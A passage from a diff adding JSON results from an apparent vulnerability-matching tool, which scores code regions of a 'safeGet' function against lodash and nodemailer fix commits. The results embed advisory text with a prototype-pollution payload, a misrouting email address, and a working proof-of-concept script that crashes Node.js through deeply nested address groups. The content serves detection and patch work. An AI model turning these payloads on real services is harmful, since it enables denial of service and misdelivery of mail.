+          "token_vulnerable": 0.4444444444444444,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.4444444444444444,
+          "containment_structural_vulnerable": 0.6111111111111112,
+          "containment_token_vulnerable": 0.3846153846153846,
+          "containment_coverage_vulnerable": 0.9,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.9705882352941176,
+          "token_patched": 0.88,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.88,
+          "containment_structural_patched": 1.0,
+          "containment_token_patched": 0.8333333333333334,
+          "containment_coverage_patched": 0.8888888888888888,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": false,
+          "correspondence_score": 0.88,
+          "vulnerable_minus_patched": -0.4355555555555556,
+          "ast_coverage": 0.9,
+          "fix_signature_coverage": 0.625,
+          "vulnerable_signature_coverage": 0.5454545454545454,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+          "retrieval_similarity": 0.9956294298171997,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0001",
+          "candidate_span": {
+            "start_byte": 34,
+            "end_byte": 86,
+            "start_line": 1,
+            "end_line": 3
+          },
+          "candidate_granularity": "block",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed:patched",
+          "reference_granularity": "changed",
+          "structural_vulnerable": 0.5964912280701754,
+          "token_vulnerable": 0.4444444444444444,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.4444444444444444,
+          "containment_structural_vulnerable": 0.6111111111111112,
+          "containment_token_vulnerable": 0.3846153846153846,
+          "containment_coverage_vulnerable": 0.9,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.9705882352941176,
+          "token_patched": 0.88,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.88,
+          "containment_structural_patched": 1.0,
+          "containment_token_patched": 0.8333333333333334,
+          "containment_coverage_patched": 0.8888888888888888,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": false,
+          "correspondence_score": 0.88,
+          "vulnerable_minus_patched": -0.4355555555555556,
+          "ast_coverage": 0.9,
+          "fix_signature_coverage": 0.625,
+          "vulnerable_signature_coverage": 0.5454545454545454,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed",
+          "retrieval_similarity": 0.9561836123466492,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0009",
+          "candidate_span": {
+            "start_byte": 118,
+            "end_byte": 195,
+            "start_line": 7,
+            "end_line": 9
+          },
+          "candidate_granularity": "changed",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:changed:patched",
+          "reference_granularity": "changed",
+          "structural_vulnerable": 0.5942028985507246,
+          "token_vulnerable": 0.45161290322580644,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.45161290322580644,
+          "containment_structural_vulnerable": 0.6333333333333333,
+          "containment_token_vulnerable": 0.4285714285714286,
+          "containment_coverage_vulnerable": 0.7692307692307693,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.8809523809523809,
+          "token_patched": 0.7586206896551724,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.7586206896551724,
+          "containment_structural_patched": 0.8125,
+          "containment_token_patched": 0.5,
+          "containment_coverage_patched": 0.6153846153846154,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": false,
+          "correspondence_score": 0.7586206896551724,
+          "vulnerable_minus_patched": -0.30700778642936594,
+          "ast_coverage": 0.7692307692307693,
+          "fix_signature_coverage": 0.6875,
+          "vulnerable_signature_coverage": 0.5454545454545454,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+          "retrieval_similarity": 0.9955171942710876,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0002",
+          "candidate_span": {
+            "start_byte": 0,
+            "end_byte": 115,
+            "start_line": 0,
+            "end_line": 5
+          },
+          "candidate_granularity": "context",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context:patched",
+          "reference_granularity": "context",
+          "structural_vulnerable": 0.5964912280701754,
+          "token_vulnerable": 0.6923076923076923,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.5964912280701754,
+          "containment_structural_vulnerable": 0.6111111111111112,
+          "containment_token_vulnerable": 0.5652173913043479,
+          "containment_coverage_vulnerable": 0.7931034482758621,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.9705882352941176,
+          "token_patched": 0.9122807017543859,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.9122807017543859,
+          "containment_structural_patched": 1.0,
+          "containment_token_patched": 0.8928571428571429,
+          "containment_coverage_patched": 0.8888888888888888,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": false,
+          "correspondence_score": 0.9122807017543859,
+          "vulnerable_minus_patched": -0.3157894736842105,
+          "ast_coverage": 0.9,
+          "fix_signature_coverage": 0.8125,
+          "vulnerable_signature_coverage": 0.7272727272727273,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+          "retrieval_similarity": 0.9723865985870361,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0005",
+          "candidate_span": {
+            "start_byte": 0,
+            "end_byte": 88,
+            "start_line": 0,
+            "end_line": 4
+          },
+          "candidate_granularity": "context",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context:patched",
+          "reference_granularity": "context",
+          "structural_vulnerable": 0.5416666666666666,
+          "token_vulnerable": 0.6818181818181818,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.5416666666666666,
+          "containment_structural_vulnerable": 0.5833333333333334,
+          "containment_token_vulnerable": 0.6190476190476191,
+          "containment_coverage_vulnerable": 0.2,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.475,
+          "token_patched": 0.7755102040816326,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.475,
+          "containment_structural_patched": 0.75,
+          "containment_token_patched": 0.9047619047619048,
+          "containment_coverage_patched": 0.25,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": true,
+          "correspondence_score": 0.5416666666666666,
+          "vulnerable_minus_patched": 0.06666666666666665,
+          "ast_coverage": 0.2,
+          "fix_signature_coverage": 0.625,
+          "vulnerable_signature_coverage": 0.5454545454545454,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+          "retrieval_similarity": 0.9687785506248474,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0004",
+          "candidate_span": {
+            "start_byte": 0,
+            "end_byte": 87,
+            "start_line": 0,
+            "end_line": 3
+          },
+          "candidate_granularity": "context",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context:patched",
+          "reference_granularity": "context",
+          "structural_vulnerable": 0.5357142857142857,
+          "token_vulnerable": 0.6818181818181818,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.5357142857142857,
+          "containment_structural_vulnerable": 0.8333333333333334,
+          "containment_token_vulnerable": 0.6190476190476191,
+          "containment_coverage_vulnerable": 0.4,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.7083333333333333,
+          "token_patched": 0.7755102040816326,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.7083333333333333,
+          "containment_structural_patched": 1.0,
+          "containment_token_patched": 0.9047619047619048,
+          "containment_coverage_patched": 0.5,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": false,
+          "correspondence_score": 0.7083333333333333,
+          "vulnerable_minus_patched": -0.17261904761904756,
+          "ast_coverage": 0.4,
+          "fix_signature_coverage": 0.625,
+          "vulnerable_signature_coverage": 0.5454545454545454,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block",
+          "retrieval_similarity": 0.9660431146621704,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0007",
+          "candidate_span": {
+            "start_byte": 30,
+            "end_byte": 214,
+            "start_line": 0,
+            "end_line": 12
+          },
+          "candidate_granularity": "block",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block:patched",
+          "reference_granularity": "block",
+          "structural_vulnerable": 0.7142857142857143,
+          "token_vulnerable": 0.4067796610169492,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.4067796610169492,
+          "containment_structural_vulnerable": 0.7727272727272727,
+          "containment_token_vulnerable": 0.4375,
+          "containment_coverage_vulnerable": 0.3548387096774194,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.6051282051282052,
+          "token_patched": 0.4,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.4,
+          "containment_structural_patched": 1.0,
+          "containment_token_patched": 0.8333333333333334,
+          "containment_coverage_patched": 0.25806451612903225,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": true,
+          "correspondence_score": 0.4067796610169492,
+          "vulnerable_minus_patched": 0.006779661016949157,
+          "ast_coverage": 0.3548387096774194,
+          "fix_signature_coverage": 0.875,
+          "vulnerable_signature_coverage": 0.7272727272727273,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block",
+          "retrieval_similarity": 0.8778913617134094,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0014",
+          "candidate_span": {
+            "start_byte": 122,
+            "end_byte": 166,
+            "start_line": 7,
+            "end_line": 7
+          },
+          "candidate_granularity": "changed",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:block:patched",
+          "reference_granularity": "block",
+          "structural_vulnerable": 0.6015037593984962,
+          "token_vulnerable": 0.48,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.48,
+          "containment_structural_vulnerable": 0.8125,
+          "containment_token_vulnerable": 0.5555555555555556,
+          "containment_coverage_vulnerable": 0.4,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.625,
+          "token_patched": 0.38095238095238093,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.38095238095238093,
+          "containment_structural_patched": 0.75,
+          "containment_token_patched": 0.4444444444444444,
+          "containment_coverage_patched": 0.6,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": true,
+          "correspondence_score": 0.48,
+          "vulnerable_minus_patched": 0.09904761904761905,
+          "ast_coverage": 0.7272727272727273,
+          "fix_signature_coverage": 0.25,
+          "vulnerable_signature_coverage": 0.18181818181818182,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function",
+          "retrieval_similarity": 0.9442534446716309,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0016",
+          "candidate_span": {
+            "start_byte": 0,
+            "end_byte": 214,
+            "start_line": 0,
+            "end_line": 12
+          },
+          "candidate_granularity": "function",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function:vulnerable",
+          "patched_region_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function:patched",
+          "reference_granularity": "function",
+          "structural_vulnerable": 0.7692307692307692,
+          "token_vulnerable": 0.5205479452054794,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.5205479452054794,
+          "containment_structural_vulnerable": 0.8125,
+          "containment_token_vulnerable": 0.5652173913043479,
+          "containment_coverage_vulnerable": 0.4444444444444444,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.9714285714285714,
+          "token_patched": 0.9183673469387755,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.9183673469387755,
+          "containment_structural_patched": 0.9558823529411764,
+          "containment_token_patched": 0.8958333333333334,
+          "containment_coverage_patched": 0.9444444444444444,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": false,
+          "correspondence_score": 0.9183673469387755,
+          "vulnerable_minus_patched": -0.3978194017332961,
+          "ast_coverage": 0.4444444444444444,
+          "fix_signature_coverage": 0.875,
+          "vulnerable_signature_coverage": 0.7272727272727273,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        },
+        {
+          "pair_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed",
+          "retrieval_similarity": 0.870469331741333,
+          "candidate_region_id": "candidate:T2-0ad8e84352303d8c8832:0006",
+          "candidate_span": {
+            "start_byte": 90,
+            "end_byte": 114,
+            "start_line": 5,
+            "end_line": 5
+          },
+          "candidate_granularity": "changed",
+          "candidate_function_name": "safeGet",
+          "vulnerable_region_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed:vulnerable",
+          "patched_region_id": "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed:patched",
+          "reference_granularity": "changed",
+          "structural_vulnerable": 0.6363636363636364,
+          "token_vulnerable": 0.48484848484848486,
+          "api_anchor_vulnerable": null,
+          "local_alignment_vulnerable": null,
+          "vulnerable_score": 0.48484848484848486,
+          "containment_structural_vulnerable": 0.75,
+          "containment_token_vulnerable": 0.5,
+          "containment_coverage_vulnerable": 0.32,
+          "containment_fallback_vulnerable": false,
+          "containment_fallback_attempted_vulnerable": true,
+          "structural_patched": 0.6153846153846154,
+          "token_patched": 0.42105263157894735,
+          "api_anchor_patched": null,
+          "local_alignment_patched": null,
+          "patched_score": 0.42105263157894735,
+          "containment_structural_patched": 0.75,
+          "containment_token_patched": 0.5,
+          "containment_coverage_patched": 0.26666666666666666,
+          "containment_fallback_patched": false,
+          "containment_fallback_attempted_patched": true,
+          "correspondence_score": 0.48484848484848486,
+          "vulnerable_minus_patched": 0.06379585326953752,
+          "ast_coverage": 0.375,
+          "fix_signature_coverage": 0.2,
+          "vulnerable_signature_coverage": 0.2777777777777778,
+          "lineage_confidence": "none",
+          "fallback_used": false
+        }
+      ],
+      "lineages": [
+        {
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "confidence": "high",
+          "score": 0.8844092096601214,
+          "repo": "lodash/lodash",
+          "file_path": "lodash.js",
+          "reference_function": "safeGet",
+          "associated_advisories": [
+            {
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ]
+            }
+          ],
+          "evidence_pair_ids": [
+            "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function"
+          ]
+        },
+        {
+          "lineage_id": "lineage-e9c5ea48bd7c56549910dd63ab88121bcb3199f31519efb6258765e3de3a3cb9",
+          "confidence": "medium",
+          "score": 0.7563725081357088,
+          "repo": "nodemailer/nodemailer",
+          "file_path": "lib/addressparser/index.js",
+          "reference_function": "_handleAddress",
+          "associated_advisories": [
+            {
+              "ghsa_id": "GHSA-mm7p-fcc7-pg87",
+              "cve_id": "CVE-2025-13033",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-20",
+                  "name": "Improper Input Validation"
+                },
+                {
+                  "cwe_id": "CWE-436",
+                  "name": "Interpretation Conflict"
+                }
+              ],
+              "severity": "medium",
+              "advisory_title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+              "advisory_description": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+              "advisory_url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+              "advisory_references": [
+                "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87",
+                "https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626",
+                "https://nvd.nist.gov/vuln/detail/CVE-2025-13033",
+                "https://access.redhat.com/security/cve/CVE-2025-13033",
+                "https://bugzilla.redhat.com/show_bug.cgi?id=2402179",
+                "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+              ],
+              "osv_id": "GHSA-mm7p-fcc7-pg87",
+              "package_name": "nodemailer",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "7.0.7"
+              ]
+            },
+            {
+              "ghsa_id": "GHSA-rcmh-qjqh-p98v",
+              "cve_id": "CVE-2025-14874",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-703",
+                  "name": "Improper Check or Handling of Exceptional Conditions"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+              "advisory_description": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",
+              "advisory_url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+              "advisory_references": [
+                "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v",
+                "https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150",
+                "https://nvd.nist.gov/vuln/detail/CVE-2025-14874",
+                "https://access.redhat.com/security/cve/CVE-2025-14874",
+                "https://bugzilla.redhat.com/show_bug.cgi?id=2418133",
+                "https://github.com/nodemailer/nodemailer/commit/6218b8df",
+                "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+              ],
+              "osv_id": "GHSA-rcmh-qjqh-p98v",
+              "package_name": "nodemailer",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "7.0.11"
+              ]
+            }
+          ],
+          "evidence_pair_ids": [
+            "boundary-77036393e97e485ad4a8ab2d0705cce2f6c2bc5febafee558f13e7ebb76286cb:changed"
+          ]
+        }
+      ],
+      "vulnerability_states": [
+        {
+          "status": "uncertain",
+          "abstention_reason": "E_SIDE_WEAK",
+          "advisories": [
+            {
+              "ghsa_id": "GHSA-4xc9-xhrj-v574",
+              "cve_id": "CVE-2018-16487",
+              "cwes": [
+                {
+                  "cwe_id": "CWE-400",
+                  "name": "Uncontrolled Resource Consumption"
+                }
+              ],
+              "severity": "high",
+              "advisory_title": "Prototype Pollution in lodash",
+              "advisory_description": "Versions of `lodash` before 4.17.11 are vulnerable to prototype pollution. \n\nThe vulnerable functions are 'defaultsDeep', 'merge', and 'mergeWith' which allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.11 or later.",
+              "advisory_url": "https://github.com/advisories/GHSA-4xc9-xhrj-v574",
+              "advisory_references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+                "https://hackerone.com/reports/380873",
+                "https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad",
+                "https://security.netapp.com/advisory/ntap-20190919-0004",
+                "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2018-16487.yml",
+                "https://github.com/advisories/GHSA-4xc9-xhrj-v574"
+              ],
+              "osv_id": "GHSA-4xc9-xhrj-v574",
+              "package_name": "lodash",
+              "ecosystem": "npm",
+              "affected_versions": [],
+              "fixed_versions": [
+                "4.17.11"
+              ]
+            }
+          ],
+          "evidence_pair_ids": [
+            "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:context",
+            "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c:function"
+          ],
+          "lineage_id": "lineage-5a49dd3ede1a384fc6fae2e6e879bdaadd145793834795b545b74f55ebbf8e3a",
+          "fix_boundary_id": "boundary-6e880cf860d880b8bcde23c66b9d2e18106372730588e959acf8f2e6acb9619c",
+          "fix_commit_sha": "90e6199a161b6445b01454517b40ef65ebecd2ad",
+          "vulnerable_score": 0.6,
+          "patched_score": 0.8695652173913043,
+          "correspondence_score": 0.9183673469387755,
+          "contrast_score": -0.26956521739130435,
+          "structural_vulnerable": 0.5964912280701754,
+          "structural_patched": 0.9714285714285714,
+          "token_vulnerable": 0.6923076923076923,
+          "token_patched": 0.9183673469387755,
+          "edit_strategy": "contrastive",
+          "edit_vulnerable": 0.6,
+          "edit_patched": 0.8695652173913043,
+          "edit_margin": -0.26956521739130435,
+          "edit_vulnerable_anchor_has_identity": false,
+          "edit_patched_anchor_has_identity": false,
+          "edit_raw_vulnerable": 0.6923076923076923,
+          "edit_raw_patched": 0.8611111111111112,
+          "edit_contrastive_vulnerable": 0.6,
+          "edit_contrastive_patched": 0.8695652173913043,
+          "edit_contrastive_used": true,
+          "structure_gate_passed": true,
+          "token_gate_passed": true,
+          "context_correspondence_passed": true,
+          "function_identity_state": "match",
+          "edit_anchor_has_identity": null,
+          "boundary_identity_gate_passed": true,
+          "boundary_rejected": false,
+          "containment_fallback_attempted": true,
+          "containment_fallback_used": false,
